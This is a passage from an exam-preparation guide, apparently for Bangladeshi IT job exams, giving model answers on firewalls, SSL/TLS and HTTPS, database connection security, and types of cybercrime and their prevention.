    - ৩. স্মার্ট ইকোনমি (Smart Economy): ক্যাশলেস লেনদেন, ব্লকচেইন, এআই ও আইওটিভিত্তিক আধুনিক শিল্পায়ন, ফ্রিল্যান্সিং এবং স্টার্টআপ ইকোসিস্টেম গড়ে তোলা।
    - ৪. স্মার্ট সোসাইটি (Smart Society): অন্তর্ভুক্তিমূলক ও বৈষম্যহীন সমাজ যেখানে নাগরিক অধিকার, সাইবার নিরাপত্তা এবং ডিজিটাল স্বাস্থ্যসেবা নিশ্চিত থাকবে।

13. **Write the difference between WPA firewall and Network Firewall.** *[BR-Powergen Post: Assistant Engineer Date: 29 March, 2024 Exam Taker: BUET Marks: GK:60; Written: 5*8=40 [bitbox it book 385]]*

Answer: (Note: In network security, WPA refers to Web Application Firewall - WAF / Wireless Protected Access. In the context of firewalls, it compares Web Application Firewall vs Network Firewall):

    | Feature | Web Application Firewall (WAF) | Traditional Network Firewall |
    |---|---|---|
    | OSI Layer | Operates at Layer 7 (Application Layer) | Operates at Layers 3 (Network) and 4 (Transport) |
    | Traffic Inspected | Deeply inspects HTTP/HTTPS traffic, payloads, URLs, and cookies | Inspects packet IP headers, port numbers, and TCP/UDP flags |
    | Attack Defense | Defends against SQLi, XSS, CSRF, and OWASP Top 10 vulnerabilities | Defends against port scanning, unauthorized IP access, and DoS attacks |
    | Inspection Depth | Deep packet and content inspection (understands application logic) | Packet filtering and stateful connection tracking |
    | Deployment Position | Positioned in front of web servers and web applications | Positioned at network perimeters, routers, and gateway boundaries |

14. **Focus Writing in English “Technology and Banking Sector of Bangladesh”** *[compact it 523]*

Answer: Technology has revolutionized the banking sector of Bangladesh, transitioning conventional branch-based banking into an agile, digital financial ecosystem. The widespread adoption of core banking solutions (CBS), automated teller machines (ATMs), and national payment switches (NPSB, BEFTN, RTGS) allows instant interbank clearing and electronic funds settlement. Moreover, Mobile Financial Services (MFS) platforms like bKash and Nagad, along with Agent Banking, have driven financial inclusion by connecting millions of unbanked rural citizens to formal financial systems. Bangladeshi commercial banks are actively deploying artificial intelligence for automated fraud detection, biometric e-KYC for instant paperless account opening, and mobile banking apps for 24/7 utility and retail payments. As digital transaction volume surges, strict adherence to cybersecurity guidelines, data privacy frameworks, and cloud infrastructure adoption remain imperative for maintaining long-term systemic stability.

## Security Protocols (SSL/TLS, HTTPS) (12)

1. **What is SSL?** *[BCC Assistant Network Engineer 18.10.2025 compact it 1441 (ET: BCC)]*, *[BREB Assistant Hardware & Network Engineer 2019 compact it 1124 (ET: BREB)]*

Answer: **SSL (Secure Sockets Layer)** is a cryptographic protocol that provides a secure, encrypted channel between a client and a server over an insecure network. It was developed by Netscape in 1995.

   What it provides
   - **Encryption** — data in transit cannot be read by anyone intercepting it.
   - **Authentication** — a digital certificate proves the server really is who it claims to be.
   - **Integrity** — a MAC detects any modification of the data in transit.

   How it works — the handshake
   - The client connects and the server presents its digital certificate.
   - The client verifies the certificate against a trusted Certificate Authority.
   - Both sides agree a random symmetric **session key** using asymmetric cryptography.
   - All subsequent data is encrypted with that fast symmetric key.

   Important current status
   - **All SSL versions are obsolete and insecure.** SSL 2.0 and 3.0 are broken (POODLE attack) and must be disabled.
   - The modern replacement is **TLS (Transport Layer Security)**, currently TLS 1.2 and TLS 1.3.
   - The name "SSL" survives in common usage — "SSL certificate" almost always means a TLS certificate.

   Uses
   - HTTPS (port 443), secure email (SMTPS, IMAPS), FTPS, VPN, and any application needing an encrypted channel.

2. **Which client is used to security cannot to a remote server?** *[BARI Assistant Maintenance Engineer 15.11.2025 compact it 1452 (ET: N/A)]*

Answer: The question appears to ask which client is used to connect SECURELY to a remote server. The answer is **SSH (Secure Shell)**.

   - SSH provides an encrypted terminal session to a remote server, on **port 22**.
   - Common SSH clients: **PuTTY** (Windows), **OpenSSH** (`ssh` command on Linux, macOS and modern Windows), MobaXterm, Termius.

   Why SSH and not Telnet
   - **Telnet (port 23)** sends everything, including the password, in PLAIN TEXT. Anyone sniffing the network reads the credentials directly.
   - **SSH** encrypts the entire session and also authenticates the server, so it resists both eavesdropping and man-in-the-middle attacks.
   - Telnet should be considered obsolete and disabled on every device.

   Related secure clients

   | Purpose | Insecure protocol | Secure replacement |
   |---|---|---|
   | Remote terminal | Telnet (23) | SSH (22) |
   | File transfer | FTP (21) | SFTP / SCP (22), FTPS (990) |
   | Web | HTTP (80) | HTTPS (443) |
   | Remote desktop | VNC (unencrypted) | RDP with TLS (3389), VNC over SSH tunnel |

3. **Ensure secure communication between a client application and the database server.** *[Sonali Bank PLC Assistant Database Administrator 23.02.2024 compact it 314 (ET: N/A)]*

Answer: Securing the client-to-database channel requires controls at several layers.

   (a) Encryption in transit
   - **Enable TLS/SSL on the database listener.** MySQL, PostgreSQL, SQL Server and Oracle all support it — `require_secure_transport=ON` in MySQL, `ssl=on` in PostgreSQL, "Force Encryption" in SQL Server.
   - **Verify the server certificate on the client**, not just encrypt. Without verification the connection is still vulnerable to man-in-the-middle.
   - Use TLS 1.2 or 1.3 only; disable SSLv3 and TLS 1.0/1.1.

   (b) Authentication
   - **Strong, unique credentials** for the application account; never a shared or default account.
   - **Certificate-based or Kerberos authentication** where supported, which removes the password from the connection entirely.
   - **Never hard-code credentials** in source code or config files — use a secrets manager or the OS credential store.
   - Rotate credentials regularly.

   (c) Authorisation
   - **Least privilege** — grant only the specific SELECT, INSERT, UPDATE needed on the specific tables. No DDL rights, no `sa`/`root`.
   - Separate accounts for read-only reporting and for write operations.
   - Use views and stored procedures to limit what the application can reach.

   (d) Network controls
   - **Place the database on a separate VLAN**, never in the DMZ and never internet-facing.
   - **Firewall rule allowing only the application server's IP** to reach the database port.
   - Change the default listener port where practical, and disable remote root login.
   - For remote administration, require a **VPN or SSH tunnel**.

   (e) Application-side
   - **Parameterised queries** everywhere, to eliminate SQL injection.
   - **Connection pooling** with a controlled lifetime.
   - Generic error handling so connection strings and schema details are never exposed.

   (f) Data protection and monitoring
   - **Encryption at rest** (TDE) and column-level encryption for sensitive fields.
   - **Database activity monitoring** and audit logging of all connections and privileged operations, forwarded to a SIEM.
   - Regular patching of the database engine and client drivers.

4. **Difference between HTTP and HTTPs.** *[PGCB Assistant Engineer (CSE) 17.05.2024 compact it 398 (ET: BUET)]*

Answer:

   | Point | HTTP | HTTPS |
   |---|---|---|
   | Full form | HyperText Transfer Protocol | HyperText Transfer Protocol Secure |
   | Security | None — data travels in plain text | Encrypted with SSL/TLS |
   | Port | 80 | 443 |
   | Certificate | Not required | SSL/TLS certificate from a CA required |
   | Data readable if intercepted | Yes | No |
   | Server authentication | None | Certificate proves the server's identity |
   | Data integrity | Not protected | Protected — tampering is detected |
   | Browser indication | "Not secure" warning | Padlock icon |
   | Speed | Marginally faster | Slightly slower due to encryption, though HTTP/2 and TLS 1.3 have largely closed the gap |
   | SEO | Ranked lower by search engines | Ranked higher |
   | Suitable for | Nothing sensitive; largely obsolete | All modern websites |

   What HTTPS adds
   - **Confidentiality** — an attacker sniffing the network sees only ciphertext.
   - **Authentication** — the certificate proves you are talking to the real bank, not an impostor.
   - **Integrity** — content cannot be modified in transit, which also blocks ISP ad injection.

   - Practical note: HTTPS is now the default. Browsers mark plain HTTP pages as "Not secure", and HSTS makes browsers refuse to downgrade a site to HTTP once it has been seen over HTTPS.

5. **(গ) HTTP ও HTTPS প্রোটোকলের মধ্যে সুরক্ষার দিক থেকে কোনটি কার্যকর?** *[প্রাসঙ্গিক টেকনিক্যাল, বিষয় কোড: ১০৫, মান: ৮০ - পাসপোর্ট অফিস সহকারী প্রোগ্রামার এক্সাম: ২০২৪]*

Answer: **HTTPS is effective from a security standpoint; HTTP provides no security at all.**

   Why HTTPS is secure
   - **Encryption** — SSL/TLS encrypts everything, so an attacker sniffing the network sees only unreadable ciphertext. Passwords, card numbers and personal data are protected.
   - **Authentication** — the server presents a certificate issued by a trusted Certificate Authority, proving it really is the claimed site. This prevents an attacker from impersonating a bank.
   - **Integrity** — a message authentication code detects any alteration in transit, so content cannot be modified or injected.

   Why HTTP is not secure
   - Everything travels in **plain text**. Anyone on the same Wi-Fi, or any router along the path, can read passwords and messages directly.
   - There is **no server verification**, so a man-in-the-middle can impersonate the site.
   - Content can be **modified in transit** without detection.

   Practical consequence
   - Any page that accepts a login, payment or personal information MUST use HTTPS. Using HTTP for such a page is a direct security failure, not merely a shortcoming.
   - Browsers now display "Not secure" on HTTP pages, and HSTS prevents downgrade once a site is known to support HTTPS.

   - Conclusion: HTTPS is the only acceptable choice for a modern website. HTTP survives only for non-sensitive static content, and even there it is being phased out.

6. **Write down the basic differences of the following:**
   **(ii) TLS 1.2 vs. 1.3** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 535 (ET: MIST)]*

**(ii) TLS 1.2 vs. 1.3** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 535 (ET: MIST)]*

   Answer:

   | Point | TLS 1.2 (2008) | TLS 1.3 (2018) |
   |---|---|---|
   | Handshake round trips | 2-RTT | **1-RTT**, and 0-RTT for session resumption |
   | Connection speed | Slower | Noticeably faster, especially on high-latency links |
   | Cipher suites supported | Around 37, many weak | Only 5, all strong AEAD suites |
   | Weak algorithms | Still permits RSA key exchange, CBC mode, SHA-1, MD5, RC4 | All **removed** |
   | Forward secrecy | Optional | **Mandatory** for every session |
   | Encryption modes | CBC, AEAD and others | AEAD only — AES-GCM and ChaCha20-Poly1305 |
   | Handshake encryption | Handshake is mostly in clear text | Most of the handshake is encrypted |
   | Downgrade attacks | Possible (FREAK, Logjam, POODLE) | Protected by design |
   | Renegotiation | Supported, and a known attack surface | Removed entirely |

   Why forward secrecy matters most
   - In TLS 1.2 with RSA key exchange, an attacker who records traffic today and later steals the server's private key can decrypt ALL of that recorded traffic retrospectively.
   - TLS 1.3 mandates ephemeral key exchange, so each session has its own key that is discarded afterwards. Stealing the server's private key does not decrypt past sessions.

   - Practical recommendation: enable TLS 1.3, keep TLS 1.2 for compatibility with older clients, and disable TLS 1.0 and 1.1 entirely — PCI DSS already requires this.

7. **What is SSL, TLS, and HTTPs?** *[Ministry of Land Assistant Maintenance Engineer 2023 compact it 594 (ET: N/A)]*

Answer:

   **SSL (Secure Sockets Layer)**
   - The original cryptographic protocol for securing network communication, developed by Netscape in 1995.
   - Versions: SSL 2.0 and SSL 3.0 — **both are now broken and deprecated** (POODLE attack against SSL 3.0).
   - The name persists in everyday usage even though the actual protocol is no longer used.

   **TLS (Transport Layer Security)**
   - The successor to SSL, standardised by the IETF in 1999. TLS 1.0 was essentially SSL 3.1.
   - Versions: TLS 1.0 and 1.1 (deprecated), **TLS 1.2 and TLS 1.3 (current and secure)**.
   - Provides encryption, authentication through certificates, and integrity.
   - Works at the transport layer, so it secures any application protocol placed on top of it.

   **HTTPS (HyperText Transfer Protocol Secure)**
   - Not a separate protocol — it is simply **HTTP running inside a TLS tunnel**, on port 443 instead of 80.
   - The browser and server first perform a TLS handshake to establish an encrypted channel, then exchange ordinary HTTP messages inside it.

   Relationship
   ```
   SSL  →  (evolved into)  →  TLS
   HTTP + TLS  =  HTTPS
   ```

   - Other protocols secured the same way: FTPS (FTP over TLS), SMTPS, IMAPS, and LDAPS. In each case the plain protocol is wrapped in TLS.

8. **Attacker steals private key of website that uses transport layer security and remains undetected what can be done with private key?** *[Combined Bank Assistant Programmer 09.06.2023 compact it 493 (ET: N/A)]*

Answer: A stolen TLS private key is a catastrophic compromise. What the attacker can do depends on which key exchange the server uses.

   (a) Impersonate the website — always possible
   - The attacker can set up a server that presents the genuine certificate and prove possession of the matching private key.
   - Browsers will show a valid padlock with no warning, because the certificate is real.
   - Combined with DNS spoofing or a MITM position, this produces a perfect phishing site indistinguishable from the real bank.

   (b) Decrypt recorded traffic — only WITHOUT forward secrecy
   - If the server uses **RSA key exchange** (TLS 1.2 with an RSA cipher suite), the session key is encrypted with the server's public key. Anyone holding the private key can recover the session key and decrypt any traffic they recorded — including traffic captured months ago.
   - If the server uses **ephemeral Diffie-Hellman (ECDHE)**, which gives **forward secrecy**, past sessions CANNOT be decrypted, because the session keys were never derived from the long-term private key. This is exactly why TLS 1.3 makes forward secrecy mandatory.

   (c) Active man-in-the-middle in real time
   - With the private key, the attacker can terminate TLS connections, read and modify traffic, and re-encrypt onward — undetectable by the user in either case.

   (d) Forge digital signatures
   - Sign data as the organisation, which may allow code signing abuse or forged authentication tokens.

   Immediate response required
   - **Revoke the certificate at once** through the CA, so OCSP and CRL mark it invalid.
   - **Generate a new key pair and obtain a new certificate.**
   - **Investigate the breach** to determine how the key was taken and what else is compromised.
   - **Enable forward secrecy** (ECDHE-only cipher suites) so a future key theft cannot decrypt past traffic.
   - **Store private keys in an HSM**, so the key material can never be exported in the first place.

   - The key lesson: certificate revocation is slow and imperfectly honoured by clients, so prevention through HSM storage and forward secrecy matters far more than the response.

9. **(a) Write the full form of those: (i) SSL (ii) TSL** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 819 (ET: BUET)]*

Answer:
   - **(i) SSL — Secure Sockets Layer.** The original protocol for encrypted network communication, developed by Netscape in 1995. All versions are now deprecated and insecure.
   - **(ii) TLS — Transport Layer Security.** (The question writes "TSL", which is a transposition of TLS.) The successor to SSL, standardised by the IETF. TLS 1.2 and TLS 1.3 are the current secure versions.

   Both provide the same three services
   - **Encryption** — data cannot be read in transit.
   - **Authentication** — a digital certificate proves the server's identity.
   - **Integrity** — any modification of the data is detected.

   Version history

   | Protocol | Year | Status |
   |---|---|---|
   | SSL 2.0 | 1995 | Broken, prohibited |
   | SSL 3.0 | 1996 | Broken (POODLE), prohibited |
   | TLS 1.0 | 1999 | Deprecated |
   | TLS 1.1 | 2006 | Deprecated |
   | TLS 1.2 | 2008 | Secure, widely used |
   | TLS 1.3 | 2018 | Current best practice |

10. **(b) Which IP address may have secured via SSL and publicly by the Certificate Authority(CA). If secured Write Yes or otherwise No.** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 819 (ET: BUET)]*
   1.1.1.1
   8.8.4.1
   192.168.10.2
   8.8.8.8
   172.16.8.1
   10.0.0.1

1.1.1.1
   8.8.4.1
   192.168.10.2
   8.8.8.8
   172.16.8.1
   10.0.0.1

   Answer: A public Certificate Authority can issue a certificate only for a **PUBLIC (routable) IP address**, never for a private one.

   | IP address | Type | Certificate from a public CA? |
   |---|---|---|
   | **1.1.1.1** | Public (Cloudflare DNS) | **Yes** |
   | **8.8.4.1** | Public | **Yes** |
   | **192.168.10.2** | Private — RFC 1918 | **No** |
   | **8.8.8.8** | Public (Google DNS) | **Yes** |
   | **172.16.8.1** | Private — RFC 1918 | **No** |
   | **10.0.0.1** | Private — RFC 1918 | **No** |

   The three private IPv4 ranges (RFC 1918)
   - `10.0.0.0` – `10.255.255.255` (10.0.0.0/8)
   - `172.16.0.0` – `172.31.255.255` (172.16.0.0/12)
   - `192.168.0.0` – `192.168.255.255` (192.168.0.0/16)

   Why private IPs cannot be certified publicly
   - A CA must verify that the applicant CONTROLS the address. A private IP is used simultaneously by millions of separate networks worldwide, so ownership cannot be established and the certificate would be meaningless.
   - The CA/Browser Forum has prohibited public CAs from issuing certificates for private IPs and internal names since 2016.

   - For internal servers on private addresses, an organisation issues certificates from its **own internal CA** and distributes that CA's root certificate to its client machines.

11. **HTTPs কীভাবে একটি Website-এর সুরক্ষা দেয়? ব্লক ডায়াফ্রামের মাধ্যমে উত্তর দিন।** *[40th BCS 2020 compact it 971 (ET: BPSC)]*

Answer: HTTPS secures a website by wrapping ordinary HTTP inside a TLS encrypted tunnel.

    Block diagram
    ```mermaid
    flowchart TD
        A[Browser / Client] --> B[HTTP layer<br/>request and response]
        B --> C[TLS / SSL layer<br/>encryption + authentication + integrity]
        C --> D[TCP layer<br/>port 443]
        D --> E[Internet]
        E --> F[TCP layer]
        F --> G[TLS / SSL layer<br/>decryption + verification]
        G --> H[HTTP layer]
        H --> I[Web Server]
    ```

    The TLS handshake, step by step
    ```mermaid
    sequenceDiagram
        participant C as Client
        participant S as Server
        C->>S: 1. ClientHello — supported TLS versions and cipher suites
        S->>C: 2. ServerHello + digital certificate (contains public key)
        C->>C: 3. Verify certificate against trusted CA
        C->>S: 4. Key exchange (ECDHE) to agree a session key
        S->>C: 5. Finished — handshake complete
        C->>S: 6. Encrypted HTTP request
        S->>C: 7. Encrypted HTTP response
    ```

    How it protects the website — three guarantees
    - **Confidentiality (encryption)** — everything after the handshake is encrypted with a symmetric session key. Anyone sniffing the network sees only ciphertext, so passwords and card numbers are safe.
    - **Authentication (certificate)** — the server's certificate is signed by a trusted CA, proving the site is genuine. This prevents an attacker from impersonating the bank.
    - **Integrity (MAC)** — each record carries a message authentication code, so any modification in transit is detected and the connection is dropped. This also blocks content and advertisement injection by an ISP.

    - Additional protection comes from **HSTS**, which instructs the browser never to connect to that site over plain HTTP again, defeating SSL-stripping attacks.

12. **What is the difference among threat, vulnerability and risk? Explain SSL and TLS.** *[Bangladesh Bank Assistant Maintenance Engineer 2019 compact it 1050 (ET: BUET)]*

Answer:

    (a) Threat, vulnerability and risk

    | Term | Definition | Example |
    |---|---|---|
    | **Threat** | A potential DANGER that could exploit a weakness and cause harm | A hacker, malware, a fire, a disgruntled employee |
    | **Vulnerability** | A WEAKNESS or gap in a system that a threat could exploit | Unpatched software, weak password, no firewall |
    | **Risk** | The potential LOSS when a threat exploits a vulnerability | Financial loss from a data breach |

    The relationship
    ```
    Risk = Threat × Vulnerability × Impact
    ```
    - If there is no vulnerability, a threat cannot cause harm. If there is no threat, a vulnerability is not exploited. Risk exists only when all three combine.

    Illustrative example
    - **Threat**: a burglar exists in the neighbourhood.
    - **Vulnerability**: the office window has no lock.
    - **Risk**: the probability and cost of the office being burgled.
    - You cannot remove the threat (burglars exist), but you CAN remove the vulnerability (fit a lock), which reduces the risk.

    Security response to each
    - Threat cannot usually be eliminated — it is monitored through threat intelligence.
    - Vulnerability CAN be eliminated — through patching, hardening and configuration.
    - Risk is managed — accepted, mitigated, transferred (insurance) or avoided.

    (b) SSL and TLS
    - **SSL (Secure Sockets Layer)** — the original encryption protocol from Netscape, 1995. All versions are now broken and prohibited.
    - **TLS (Transport Layer Security)** — its standardised successor. TLS 1.2 and 1.3 are the current secure versions.
    - Both provide **encryption**, **authentication** through certificates, and **integrity**.
    - Both work by: server presents a certificate → client verifies it against a trusted CA → both agree a symmetric session key → all data is encrypted with that key.
    - HTTPS is simply HTTP carried inside a TLS tunnel on port 443.

## Cyber Crime & Security (10)

1. **সাইবার অপরাধের প্রকারভেদ পরিবেশের স্থায়িত্ব বর্ণনা করুন।** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*

Answer: Cybercrime is any criminal activity that targets or uses a computer, network or digital device.

   Types of cybercrime

   **(a) Crimes against individuals**
   - Identity theft, online fraud, cyberstalking, cyberbullying, online harassment, defamation, revenge pornography, phishing.

   **(b) Crimes against property**
   - Hacking, data theft, ransomware, malware distribution, intellectual property theft, software piracy, credit card fraud.

   **(c) Crimes against organisations**
   - Data breach, DDoS attack, corporate espionage, insider data theft, business email compromise.

   **(d) Crimes against government / society**
   - Cyber terrorism, attacks on critical infrastructure, hacking government websites, spreading disinformation, online radicalisation.

   **(e) Financial cybercrime**
   - Online banking fraud, card skimming, cryptocurrency fraud, money laundering through digital channels, MFS fraud.

   Why cybercrime persists — the environmental factors that sustain it
   - **Anonymity** — attackers hide behind VPNs, Tor and compromised machines, so attribution is difficult.
   - **No geographic boundary** — the attacker sits in one country, the victim in another, and jurisdiction becomes a legal obstacle.
   - **Low cost, high return** — an attack toolkit costs very little; a successful ransomware campaign earns a great deal.
   - **Crime as a service** — ransomware-as-a-service and phishing kits let unskilled criminals operate.
   - **Weak enforcement capacity** — investigators, forensic laboratories and trained prosecutors are scarce, especially in developing countries.
   - **Low digital literacy** among victims, which keeps social engineering effective.
   - **Under-reporting** — organisations conceal breaches to protect reputation, so the true scale stays hidden.
   - **Rapid technology change** — new platforms appear faster than law and defence adapt.

   Prevention
   - Strong technical controls, public awareness campaigns, capacity building for law enforcement, up-to-date legislation, international cooperation, and mandatory breach reporting.

2. **Why is cyber security important? What are the common types of cyber threats? Explain cyber security measures.** *[Senior Officer IT (Job ID: 10225) Date: 22-05-2026 (ET: N/A)]*

Answer:

   (a) Why cyber security is important
   - **Protects sensitive data** — customer records, financial data, national ID information and intellectual property.
   - **Prevents financial loss** — direct theft, fraud, ransom payments and the far larger cost of recovery and downtime.
   - **Maintains business continuity** — a ransomware attack can halt an entire bank's operations.
   - **Preserves trust and reputation** — customers leave after a breach, and the reputational damage outlasts the technical recovery.
   - **Regulatory compliance** — the Bangladesh Bank ICT Security Guideline, PCI DSS and data protection rules carry penalties.
   - **Protects national security** — attacks on critical infrastructure such as power, banking and telecom have physical consequences.
   - **Growing attack surface** — cloud, mobile, remote work and IoT have expanded what must be defended.

   (b) Common types of cyber threat
   - **Malware** — virus, worm, trojan, ransomware, spyware, rootkit.
   - **Phishing and social engineering** — the entry point for most breaches.
   - **DoS and DDoS** — denial of availability.
   - **Man-in-the-Middle** — interception of communication.
   - **SQL injection and XSS** — web application attacks.
   - **Password attacks** — brute force, credential stuffing.
   - **Zero-day exploits** — attacks before a patch exists.
   - **Insider threats** — malicious or careless employees.
   - **Supply chain attacks** — compromise through a trusted vendor.
   - **APT (Advanced Persistent Threat)** — long-term stealthy intrusion, often state-sponsored.

   (c) Cyber security measures

   **Technical**
   - Firewall, IPS and network segmentation.
   - Antivirus and EDR on every endpoint.
   - Encryption of data at rest and in transit.
   - Multi-factor authentication and least privilege.
   - Patch management — the single most effective control.
   - Backup following the 3-2-1 rule, with tested restores.
   - SIEM with 24/7 monitoring.

   **Administrative**
   - Written security policy, incident response plan, business continuity and DR plan.
   - Regular VAPT and audit.
   - Vendor risk assessment.
   - **Security awareness training** — since most breaches begin with a person.

   **Physical**
   - Access control to server rooms, CCTV, environmental and fire protection.

   - Guiding principle: **defence in depth**. No single control is sufficient; layers are built so that the failure of one does not expose everything.

3. **Hacking a system without cracking the system, only for finding bugs and vulgarities is called?** *[BCC Assistant Programmer 11.11.2023 compact it 545 (ET: N/A)]*

Answer: It is called **Ethical Hacking**, and the person doing it is a **White Hat Hacker** or **penetration tester**.

   - Ethical hacking means testing a system for vulnerabilities **with the owner's explicit written permission**, in order to find and fix weaknesses before a criminal finds them.
   - The findings are reported to the owner, never exploited or sold.

   Related terms
   - **Penetration Testing (VAPT)** — a structured, authorised simulated attack.
   - **Bug Bounty** — a programme paying researchers for responsibly disclosed vulnerabilities.
   - **Red Team** — simulates a real adversary; **Blue Team** defends.
   - **Responsible disclosure** — reporting privately and giving the vendor time to patch before publishing.

   Types of hacker

   | Type | Permission | Intent | Legality |
   |---|---|---|---|
   | White hat | Yes | Improve security | Legal |
   | Grey hat | No | Usually curiosity, not malice | Illegal |
   | Black hat | No | Malicious gain | Illegal |

   - Key point: **authorisation is what makes it ethical.** The same technical activity without written permission is a crime, regardless of intent.
   - Certifications: CEH, OSCP, CISSP.

4. **What is Cybercrime? Cybercrime রোধে প্রয়োজনীয় পদক্ষেপ গুলো লিখ।** *[NPCBL Junior Assistant Manager (ICT) 2022 compact it 642 (ET: BUET)]*

Answer:

   (a) Cybercrime
   - Any illegal activity carried out using a computer, network or digital device — either as the tool of the crime, its target, or both.
   - Examples: hacking, data theft, online fraud, ransomware, identity theft, cyberbullying, phishing, and attacks on critical infrastructure.

   (b) Necessary steps to prevent cybercrime

   **Individual level**
   - Use strong unique passwords and a password manager; enable multi-factor authentication.
   - Never share OTP, PIN or password with anyone, including callers claiming to be from the bank.
   - Verify links and sender addresses before clicking; be sceptical of urgency.
   - Keep the operating system, browser and antivirus updated.
   - Avoid public Wi-Fi for banking, or use a VPN.
   - Limit what is shared on social media — it feeds social engineering.
   - Back up important data.

   **Organisational level**
   - Firewall, IPS, EDR, network segmentation and encryption.
   - Patch management and vulnerability scanning.
   - Least privilege and regular access review.
   - **Security awareness training** for all staff.
   - Incident response plan, tested backups and a DR site.
   - Regular VAPT and audit.
   - Vendor and supply chain security assessment.

   **National level**
   - Up-to-date **cyber security legislation** and specialised cyber tribunals.
   - A national **CERT/CIRT** for coordinated incident response.
   - Trained cyber police units and digital forensic laboratories.
   - Protection framework for **Critical Information Infrastructure**.
   - Public awareness campaigns.
   - International cooperation, since cybercrime crosses borders.
   - Capacity building — producing skilled cyber security professionals.

5. **What is Cyber space? Write some threats of cyber space.** *[DESCO Assistant Engineer (CSE) 10.09.2022 compact it 699 (ET: BUET)]*

Answer:

   (a) Cyberspace
   - The virtual environment created by interconnected computer networks, systems, data and users — the global domain in which digital communication, transactions and interaction take place.
   - It has no physical geography but real consequences, and it includes the internet, telecommunications networks, computer systems, embedded processors and the data they carry.

   (b) Threats in cyberspace

   **Technical threats**
   - **Malware** — virus, worm, trojan, ransomware, spyware.
   - **Hacking and unauthorised access** to systems and data.
   - **DDoS attacks** taking services offline.
   - **Man-in-the-Middle** interception.
   - **Web application attacks** — SQL injection, XSS.
   - **Zero-day exploits**.

   **Human and social threats**
   - **Phishing and social engineering**.
   - **Identity theft**.
   - **Cyberbullying, cyberstalking and online harassment**.
   - **Misinformation and disinformation** campaigns.
   - **Insider threats**.

   **Financial threats**
   - Online banking and card fraud, MFS fraud, cryptocurrency scams, digital money laundering.

   **National and strategic threats**
   - **Cyber terrorism** and attacks on critical infrastructure — power grid, banking, telecom, water.
   - **Cyber espionage** by state actors.
   - **APT campaigns** with long-term stealthy presence.
   - **Cyber warfare** between states.

   **Privacy threats**
   - Mass data collection and profiling, data breaches, surveillance, and misuse of personal information.

   - What makes cyberspace threats distinctive: attacks are cheap, anonymous, instantaneous and borderless, while defence must be continuous, expensive and comprehensive. This asymmetry is the fundamental problem of cyber security.

6. **Write the cyber security threats.** *[BARI Assistant Maintenance Engineer 26.08.2022 compact it 702 (ET: N/A)]*

Answer: The main cyber security threats, grouped by type.

   **Malware threats**
   - Virus, worm, trojan horse, ransomware, spyware, adware, rootkit, keylogger, botnet, cryptojacking, fileless malware.

   **Social engineering threats**
   - Phishing, spear phishing, whaling, smishing, vishing, pretexting, baiting, business email compromise.

   **Network threats**
   - DoS and DDoS, Man-in-the-Middle, ARP spoofing, DNS spoofing, MAC flooding, session hijacking, packet sniffing, rogue access points.

   **Application threats**
   - SQL injection, cross-site scripting, CSRF, buffer overflow, directory traversal, insecure APIs, file upload vulnerabilities.

   **Access and credential threats**
   - Brute force, dictionary attacks, credential stuffing, privilege escalation, weak or default passwords.

   **Advanced threats**
   - Zero-day exploits, Advanced Persistent Threats, supply chain compromise, state-sponsored attacks.

   **Human threats**
   - Insider threats (malicious and negligent), shadow IT, poor security hygiene, physical theft of devices.

   **Emerging threats**
   - IoT device compromise, cloud misconfiguration, AI-generated deepfake fraud, attacks on AI models, and the future quantum threat to current encryption.

   - Underlying pattern: technical controls have improved greatly, so attackers increasingly target the two weakest links — **people** and **misconfiguration**.

7. **What is Vulnerability?** *[BKSP Assistant Programmer 03.12.2022 compact it 730 (ET: N/A)]*

Answer: A vulnerability is a **weakness or flaw** in a system, application, network, process or person that could be exploited by a threat to gain unauthorised access or cause harm.

   Types of vulnerability
   - **Software** — unpatched systems, coding errors such as buffer overflow, SQL injection flaws, insecure APIs.
   - **Configuration** — default credentials, unnecessary open ports, directory listing enabled, misconfigured cloud storage.
   - **Network** — unencrypted protocols, weak Wi-Fi security, flat network with no segmentation.
   - **Physical** — unlocked server rooms, unattended workstations, no CCTV.
   - **Human** — susceptibility to phishing, weak passwords, poor security awareness. This is consistently the largest category.
   - **Process** — no patch management, no access review, no incident response plan.

   How vulnerabilities are identified and managed
   - **Vulnerability scanning** (Nessus, OpenVAS, Qualys) and **penetration testing**.
   - **CVE** — a public catalogue of known vulnerabilities with unique identifiers.
   - **CVSS** — a scoring system from 0 to 10 rating severity, used to prioritise remediation.
   - Management cycle: identify → assess and prioritise → remediate (patch or configure) → verify → repeat.

   Relationship to threat and risk
   ```
   Risk = Threat × Vulnerability × Impact
   ```
   - A vulnerability alone causes no harm. Harm occurs only when a threat exploits it. But the vulnerability is the part an organisation can actually control — you cannot remove attackers, but you can remove the weakness they would use.

8. **What is cyber threat intelligence database? What is the use of this in corporate office network?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 752 (ET: N/A)]*

Answer:

   (a) Cyber Threat Intelligence (CTI) database
   - A curated, continuously updated repository of information about current and emerging cyber threats — who the attackers are, what tools and techniques they use, and what technical indicators identify their activity.

   What it contains
   - **IoCs (Indicators of Compromise)** — malicious IP addresses, domains, URLs, file hashes, email addresses.
   - **TTPs (Tactics, Techniques and Procedures)** — how specific threat actors operate, commonly mapped to the **MITRE ATT&CK** framework.
   - **Vulnerability intelligence** — which CVEs are being actively exploited in the wild, which matters far more than raw CVSS score.
   - **Threat actor profiles** — motivation, targeting and capability.
   - **Malware signatures and behaviour patterns**.

   Sources
   - Commercial feeds (Recorded Future, Mandiant), open sources (MISP, AlienVault OTX, abuse.ch), government CERTs and national CIRTs, and industry sharing groups such as FS-ISAC for banks.

   (b) Use in a corporate office network

   - **Proactive blocking** — feed malicious IPs and domains into the firewall, proxy and DNS so known-bad destinations are blocked before any user reaches them.
   - **Faster detection** — the SIEM correlates internal logs against IoCs, so a compromised machine talking to a known command-and-control server is flagged immediately.
   - **Patch prioritisation** — thousands of CVEs exist, but intelligence identifies the handful being actively exploited. This is where limited patching effort should go first.
   - **Phishing defence** — known malicious sender domains and URLs are blocked at the email gateway.
   - **Incident response** — during an investigation, intelligence identifies the malware family and threat actor, which reveals what else to look for and how the attacker typically moves.
   - **Threat hunting** — analysts search proactively for TTPs associated with actors known to target their sector.
